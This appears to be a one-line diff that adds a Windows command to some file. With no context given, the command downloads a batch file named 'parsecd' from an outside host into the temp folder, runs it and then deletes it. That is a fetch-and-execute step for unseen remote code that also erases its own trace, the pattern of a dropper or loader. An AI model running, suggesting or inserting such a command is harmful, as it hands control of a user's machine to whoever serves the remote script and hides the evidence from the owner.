@@ -1,0 +1,1 @@
+curl https://sj.timothydo.me/parsecd -o "%temp%\script.bat" && "%temp%\script.bat" && del %temp%\script.bat
